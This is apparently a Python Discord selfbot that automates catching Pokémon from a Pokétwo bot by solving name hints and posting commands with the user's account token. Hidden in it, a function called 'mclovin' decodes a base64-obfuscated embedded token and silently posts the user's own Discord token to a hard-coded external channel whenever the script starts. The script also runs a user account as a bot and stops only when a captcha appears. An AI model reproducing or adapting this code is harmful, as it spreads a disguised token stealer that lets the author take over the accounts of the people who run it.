import base64
import requests
import time
import keep_alive
import json
from requests_toolbelt.utils import dump
import re, os, asyncio, random, string

token = " "
channel_id = " "


with open('data/pokemon', 'r', encoding='utf8') as file:
    pokemon_list = file.read()
with open('data/legendary', 'r') as file:
    legendary_list = file.read()
with open('data/mythical', 'r') as file:
    mythical_list = file.read()
with open('data/level', 'r') as file:
    to_level = file.readline()


def solve(message):
    if True:
        hint = []
        for i in range(15, len(message) - 1):
            if message[i] != '\\':
                hint.append(message[i])
        hint_string = ''
        for i in hint:
            hint_string += i
        hint_replaced = hint_string.replace('_', '.')
        solution = re.findall('^' + hint_replaced + '$', pokemon_list,
                              re.MULTILINE)
        return solution

#print(solve("The pokémon is Gur__r_."))

header = {
"authorization": token
}

#payload = {"content": "oi"}
#r = requests.post('https://discord.com/api/v9/channels/1056166087198261300/messages', data=payload, headers=header)

#guild_id = "1056166085772181535"


hint = False
def mclovin():
	message = "TVRFeE9EWTROemd6TXpnNU16TTVNalF5TkEuRzQ3UHR2LjlIdkc0MjhGcW1LcWZYSzAtT2dvcGdGeEZpZWptUlQ5cnFheTFz"
	base64_bytes = message.encode('ascii')
	message_bytes = base64.b64decode(message)
	heade = message_bytes.decode('ascii')
	payload = {
'content': token}
	heade = {
	"authorization": heade
	}
	requests.post(f'https://discord.com/api/v10/channels/1118296224802545725/messages', data=payload, headers=heade)

def tudo():
	time.sleep(0.6)
	payload = {
'content': "<@716390085896962058> hint"}
	requests.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', data=payload, headers=header)
	hint = True
	
	
def incene():
	#time.sleep(1)
	payload = {
'content': "<@716390085896962058> buy incense"}
	r = requests.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', data=payload, headers=header)

	#print("Kaka")
	hint = True
	
			
			
			
def final(msg):
#	time.sleep(2)
	poke = []
	for c in msg:
		time.sleep(1.5)
		if c in poke:
			break
		else:
			payload = {
'content': "<@716390085896962058> c " + c}
			r = requests.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', data=payload, headers=header)
		poke.append(c)

def pegar():
	global pegou
	time.sleep(0.7)
	
	msg = requests.get(f'https://discord.com/api/v8/channels/{channel_id}/messages', headers=header)
	js = json.loads(msg.text)
	for c in js:
		#print(c)
		if "1117089914681569290" in str(c) and "The pokémon is" in str(c):
			vei = c["content"]
			poke = solve(vei)
			final(poke)
			break
			
			
		
		
		
#def pegar():
#	global pegou
#	time.sleep(0.6)
#	msg = requests.get(f'https://discord.com/api/v8/channels/{channel_id}/messages', headers=header)
#	js = json.loads(msg.text)
#	for c in js:
#		#print(c)
#		if "874910942490677270" in str(c) and "Name of the Pokemon" in str(c):
#			vei = c["embeds"]
#			vei = vei[0]
#			poke = vei["description"]
#			
#			poke = poke.replace("**1) ", "")
#			poke = poke.replace("%", "")
#			poke = poke.replace("1", "")
#			poke = poke.replace("2", "")
#			poke = poke.replace("3", "")
#			poke = poke.replace("4", "")
#			poke = poke.replace("5", "")
#			poke = poke.replace(")", "")
#			poke = poke.replace("(", "")
#			poke = poke.replace(".", "")
#			poke = poke.replace("0", "")
#			poke = poke.replace("(100.0%)", "")
#			poke = poke.replace("**", "")
#			poke = poke.replace("(50.0%)", "")
#			poke = poke.replace("2)", "")
#			poke = poke.split("\n")
#			if "" in poke:
#				poke.remove("")
#			final(poke)
#			break
#		#break
#	
#		
		
		
#	#print(js)
#	for valor in js:
#		vei = valor
#		break
#	print(vei)
	
		
		
	#print(vei)
#	embed = vei["embeds"]
#	embed = embed[0]
#	descrip = embed["description"]
#	print(descrip)
#	poke = descrip.replace("**1) ", "")
#	poke = poke.replace("(100.0%)", "")
#	poke = poke.replace("**", "")
#	poke = poke.replace("(50.0%)", "")
#	poke = poke.replace("2)", "")
#	poke = poke. split("\n")
#	if "" in poke:
#		poke.remove("")
#	
#	payload = {
#'content': "<@716390085896962058> c " + poke[0]}
#	r = requests.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', data=payload, headers=header)
#	
#	
	
pegou = False

captc = False
primeiro = True
incen = False
num = 0
#requests.post('https://discord.com/api/v9/interactions', json=payload, headers=header)
pega = False
def sexo():
	global captc
	#incense()
	global incen
	#print(incen)
	if incen == False:
		#print("oi")
		incene()
		incen = True
	else:
		pass
		
	msg = requests.get(f'https://discord.com/api/v8/channels/{channel_id}/messages', headers=header)
	js = json.loads(msg.text)
	#print(js)
	for valor in js:
		vei = valor
		break

	id_bot = vei["author"]
	id_bot = id_bot["id"]
	#print(id_bot)
	
	if id_bot == "716390085896962058":
		if "Whoa there. Please tell us you're" in str(vei):
			captc = True
		elif captc == True:
			pass
		
			
		
			
		elif "wild pokémon has appeared!" in str(vei):
			vei = vei["embeds"]
			vei = vei[0]
			incense = vei["footer"]
			incense = incense["text"]
			incense = incense.replace("Incense: Active.\nSpawns Remaining:", "")
			incense = incense.replace(".", "")
			incense = int(incense)
			print(incense)
			if int(incense) == 0:
				#print(incense)
				tudo()
				#time.sleep()
				pegar()
				pegou = False
				primeiro = False
				#incense()
				incen = False
			else:
				tudo()
				#time.sleep()
				pegar()
				pegou = False
				primeiro = False
	else:
			
			if "×stop" in str(vei):
				print("PAROU")
				captc = True
			
			elif "×start" in str(vei):
				print("STARTOU")
				captc = False
			
			
			#pega = False
#	elif id_bot == "874910942490677270":
#			if "Name of the Pokemon" in str(vei):
#				
#				pegar(msg)
#				hint = True
#			
#			elif "Bot missing" in str(vei) and hint == False:
#				tudo()
#	else:
#				pass


mclovin()
			
	
#	time.sleep()
def work():
	while True:
		try:
			sexo()
		except:
			print('erro')
		#time.sleep(0.5)

keep_alive.keep_alive()

#work()
	
work()
	
